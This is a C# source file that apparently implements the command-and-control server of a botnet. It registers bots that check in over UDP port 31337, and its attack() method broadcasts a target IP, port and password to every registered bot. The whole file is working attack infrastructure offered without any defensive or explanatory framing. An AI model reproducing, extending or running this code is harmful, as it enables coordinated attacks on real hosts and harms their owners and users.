using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CNC
{
    class CNC
    {
        private UdpClient listener;
        List<botInfo> lst;
        Mutex m1;
        string name;
        struct botInfo
        {
            public string IP;
            public UInt16 port;
        }

        public CNC(String name)
        {
            this.listener = new UdpClient(31337);
            this.m1 = new Mutex();
            this.name = name;
            this.lst = new List<botInfo>();
        }

        public void listen()
        {
            while (true)
            {
                IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
                UInt16 botPort;
                Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);
                if (receiveBytes.Length == 2)
                {
                    botPort = BitConverter.ToUInt16(receiveBytes, 0);
                    botInfo bi;
                    bi.port = botPort;
                    bi.IP = RemoteIpEndPoint.Address.ToString();
                    m1.WaitOne();
                    if (!(lst.Any(item => item.IP.Equals(bi.IP) && item.port == bi.port)))
                        lst.Add(bi);
                    m1.ReleaseMutex();
                }
            }



        }
        public void attack(string iP, ushort port, string password)
        {
            
            List<Byte> message = new List<Byte>();
            message.AddRange(IPAddress.Parse(iP).GetAddressBytes());
            message.AddRange(BitConverter.GetBytes(port));
            message.AddRange(Encoding.ASCII.GetBytes(password));
            message.AddRange(Encoding.ASCII.GetBytes(this.name.PadRight(32)));
            byte[] byteMessage = message.ToArray();

            m1.WaitOne();
            foreach (botInfo bi in lst)
                listener.Send(byteMessage, byteMessage.Length,bi.IP,Convert.ToInt32(bi.port));
            m1.ReleaseMutex();
        }
    }
}
